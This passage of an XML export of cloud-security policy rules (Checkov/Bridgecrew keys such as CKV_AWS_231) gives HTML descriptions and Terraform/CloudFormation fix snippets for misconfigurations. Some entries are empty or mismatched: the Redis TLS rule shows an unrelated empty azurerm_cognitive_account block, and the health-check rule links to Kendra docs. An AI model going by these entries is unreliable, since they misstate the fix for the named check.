<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-server_side_encryption_configurationkms_key_id"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-server-side-encryption-configuration-kms-key-id"></div>Arguments: server_side_encryption_configuration.kms_key_id</div><a aria-label="Skip link to Arguments: server_side_encryption_configuration.kms_key_id" class="heading-anchor-icon fa fa-anchor" href="#arguments-server_side_encryption_configurationkms_key_id"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_kendra_index" "pass" {
  name     = "example"
  role_arn = aws_iam_role.this.arn

  server_side_encryption_configuration {
    kms_key_id = data.aws_kms_key.this.arn
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-kendra-index-server-side-encryption-uses-customer-managed-keys-cmks-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-kendra-index-server-side-encryption-uses-customer-managed-keys-cmks-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-kendra-index-server-side-encryption-uses-customer-managed-keys-cmks-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_96</key>
    <name>Ensure GCP Vertex AI Metadata Store uses a Customer Manager Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-vertex-ai-metadata-store-does-not-use-a-customer-manager-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-vertex-ai-metadata-store-does-not-use-a-customer-manager-key-cmk"></div>GCP Vertex AI Metadata Store does not use a Customer Manager Key (CMK) </div><a aria-label="Skip link to GCP Vertex AI Metadata Store does not use a Customer Manager Key (CMK) " class="heading-anchor-icon fa fa-anchor" href="#gcp-vertex-ai-metadata-store-does-not-use-a-customer-manager-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Vertex AI Metadata Stores which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer-managed KMS Keys to encrypt your Vertex AI Metadata Store data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: google_vertex_ai_metadata_store</li>
<li><strong>Arguments</strong>: region.encryption_spec.kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_vertex_ai_metadata_store" "pass" {
  name        = "test-store"
  description = "Store to test the terraform module"
  region      = "us-central1"
     encryption_spec {
         kms_key_name=google_kms_crypto_key.example.name
     }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-metadata-store-uses-a-customer-manager-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-metadata-store-uses-a-customer-manager-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-metadata-store-uses-a-customer-manager-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_217</key>
    <name>Ensure AWS API deployments enable Create before Destroy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-api-deployments-do-not-enable-create-before-destroy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-api-deployments-do-not-enable-create-before-destroy"></div>AWS API deployments do not enable Create before Destroy</div><a aria-label="Skip link to AWS API deployments do not enable Create before Destroy" class="heading-anchor-icon fa fa-anchor" href="#aws-api-deployments-do-not-enable-create-before-destroy"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>It is recommended to enable create_before_destroy argument inside the resource lifecycle configuration block to avoid possible return errors such as <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">BadRequestException: Active stages pointing to this deployment must be moved or deleted</code> on recreation.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p>CloudFormation creates a new deployment first and then will delete the old one automatically.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_api_gateway_deployment" "example" {
  rest_api_id = aws_api_gateway_rest_api.example.id
  stage_name  = "example"
  
+ lifecycle {
+   create_before_destroy = true
+ }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-api-deployments-enable-create-before-destroy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-api-deployments-enable-create-before-destroy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-api-deployments-enable-create-before-destroy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_231</key>
    <name>Ensure AWS NACL does not allow ingress from 0.0.0.0/0 to port 3389</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-nacl-allows-ingress-from-00000-to-port-3389"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-nacl-allows-ingress-from-0-0-0-0-0-to-port-3389"></div>AWS NACL allows ingress from 0.0.0.0/0 to port 3389</div><a aria-label="Skip link to AWS NACL allows ingress from 0.0.0.0/0 to port 3389" class="heading-anchor-icon fa fa-anchor" href="#aws-nacl-allows-ingress-from-00000-to-port-3389"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Network Access Control List (NACL) is stateless and provides filtering of ingress/egress network traffic to AWS resources. We recommend that NACLs do not allow unrestricted ingress access to port 3389. Removing unfettered connectivity to remote console services, such as RDP, reduces a server's exposure to risk.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:  
  InboundRule:
    Type: AWS::EC2::NetworkAclEntry
    Properties:
       NetworkAclId:
         Ref: MyNACL
       RuleNumber: 200
       Protocol: 6
       RuleAction: allow
-      CidrBlock: 0.0.0.0/0
+      CidrBlock: 10.0.0.0/32
       PortRange:
         From: 3389
         To: 3389
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_network_acl_rule" "example" {
  network_acl_id = aws_network_acl.example.id
  rule_number    = 200
  egress         = false
  protocol       = "tcp"
  rule_action    = "allow"
- cidr_block     = "0.0.0.0/0"
+ cidr_block     = "10.0.0.0/32"
  from_port      = 3389
  to_port        = 3389
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-3389' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-3389</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-3389' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_213</key>
    <name>Ensure AWS ELB Policy uses only secure protocols</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elb-policy-uses-some-unsecure-protocols"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elb-policy-uses-some-unsecure-protocols"></div>AWS ELB Policy uses some unsecure protocols</div><a aria-label="Skip link to AWS ELB Policy uses some unsecure protocols" class="heading-anchor-icon fa fa-anchor" href="#aws-elb-policy-uses-some-unsecure-protocols"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-elb-policy-uses-only-secure-protocols' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-elb-policy-uses-only-secure-protocols</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-elb-policy-uses-only-secure-protocols' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_261</key>
    <name>Ensure AWS HTTP and HTTPS target groups define health check</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-http-and-https-target-groups-do-not-define-health-check"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-http-and-https-target-groups-do-not-define-health-check"></div>AWS HTTP and HTTPS target groups do not define health check</div><a aria-label="Skip link to AWS HTTP and HTTPS target groups do not define health check" class="heading-anchor-icon fa fa-anchor" href="#aws-http-and-https-target-groups-do-not-define-health-check"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Health checks ensure that a target is reachable before sending traffic from a load balancer to the endpoint. This is a best practice compared to blindly sending traffic to what can be unhealthy targets.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>The way you enable health checks varies by the endpoint. If you are using an autoscaling group:</p>
<ol>
<li>Go to the EC2 console and select Auto Scaling Groups</li>
<li>Select the check box next to an existing group</li>
<li>On the Details tab, choose Health checks and Edit</li>
<li>Select your health check type</li>
<li>Add a Health check grace period</li>
<li>Select update</li>
</ol>
<p>Or for the load balancer:</p>
<ol>
<li>Open the Amazon EC2 console</li>
<li>Under Load Balancing, select Load Balancers</li>
<li>Select your load balancer</li>
<li>On the Health Check tab, choose Edit Health Check</li>
<li>On the Configure Health Check page, configure your health check</li>
<li>Select Save</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource:</strong> aws_lb_target_group, aws_alb_target_group</li>
<li><strong>Argument:</strong> health_check</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-Go theme-light" data-lang="Go" name="">resource "aws_alb_target_group" "example" {
  name = "target-group-1"
  port = 80
  protocol = "HTTP"

+  health_check {
+    path = "/api/1/resolve/default?path=/service/my-service"
+    ...
+    matcher = "200"  # has to be HTTP 200 or fails
+  }
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-kendra-index-server-side-encryption-uses-customer-managed-keys-cmks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-kendra-index-server-side-encryption-uses-customer-managed-keys-cmks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-kendra-index-server-side-encryption-uses-customer-managed-keys-cmks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_148</key>
    <name>Ensure Azure Redis Cache uses the latest version of TLS encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-redis-cache-does-not-use-the-latest-version-of-tls-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-redis-cache-does-not-use-the-latest-version-of-tls-encryption"></div>Azure Redis Cache does not use the latest version of TLS encryption</div><a aria-label="Skip link to Azure Redis Cache does not use the latest version of TLS encryption" class="heading-anchor-icon fa fa-anchor" href="#azure-redis-cache-does-not-use-the-latest-version-of-tls-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-redis-cache-uses-the-latest-version-of-tls-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-redis-cache-uses-the-latest-version-of-tls-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-redis-cache-uses-the-latest-version-of-tls-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_43</key>
    <name>Ensure Alibaba Cloud MongoDB instance is not public</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-mongodb-instance-is-public"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-mongo-db-instance-is-public"></div>Alibaba Cloud MongoDB instance is public</div><a aria-label="Skip link to Alibaba Cloud MongoDB instance is public" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-mongodb-instance-is-public"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-instance-is-not-public' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-instance-is-not-public</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-instance-is-not-public' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_225</key>
    <name>Ensure AWS API Gateway method settings enable caching</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-api-gateway-method-settings-do-not-enable-caching"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-api-gateway-method-settings-do-not-enable-caching"></div>AWS API Gateway method settings do not enable caching</div><a aria-label="Skip link to AWS API Gateway method settings do not enable caching" class="heading-anchor-icon fa fa-anchor" href="#aws-api-gateway-method-settings-do-not-enable-caching"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-method-settings-enable-caching' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-method-settings-enable-caching</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-method-settings-enable-caching' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_162</key>
    <name>Ensure Azure Spring Cloud API Portal Public Access is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-spring-cloud-api-portal-public-access-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-spring-cloud-api-portal-public-access-is-enabled"></div>Azure Spring Cloud API Portal Public Access is enabled</div><a aria-label="Skip link to Azure Spring Cloud API Portal Public Access is enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-spring-cloud-api-portal-public-access-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-spring-cloud-api-portal-public-access-is-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-spring-cloud-api-portal-public-access-is-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-spring-cloud-api-portal-public-access-is-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_10</key>
    <name>Ensure Docker WORKDIR values are absolute paths</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="docker-workdir-values-are-not-absolute-paths"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-docker-workdir-values-are-not-absolute-paths"></div>Docker WORKDIR values are not absolute paths</div><a aria-label="Skip link to Docker WORKDIR values are not absolute paths" class="heading-anchor-icon fa fa-anchor" href="#docker-workdir-values-are-not-absolute-paths"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-docker-workdir-values-are-absolute-paths' target='_blank'> https://docs.bridgecrew.io/docs/ensure-docker-workdir-values-are-absolute-paths</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-docker-workdir-values-are-absolute-paths' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_258</key>
    <name>Ensure AWS AuthType for your Lambda function URLs is defined</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-lambda-function-urls-authtype-is-not-defined"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-lambda-function-ur-ls-auth-type-is-not-defined"></div>AWS Lambda function URLs AuthType is not defined</div><a aria-label="Skip link to AWS Lambda function URLs AuthType is not defined" class="heading-anchor-icon fa fa-anchor" href="#aws-lambda-function-urls-authtype-is-not-defined"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-authtype-for-your-lambda-function-urls-is-defined' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-authtype-for-your-lambda-function-urls-is-defined</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-authtype-for-your-lambda-function-urls-is-defined' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_140</key>
    <name>Ensure Azure CosmosDB has Local Authentication disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-cosmosdb-does-not-have-local-authentication-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-cosmos-db-does-not-have-local-authentication-disabled"></div>Azure CosmosDB does not have Local Authentication disabled</div><a aria-label="Skip link to Azure CosmosDB does not have Local Authentication disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-cosmosdb-does-not-have-local-authentication-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
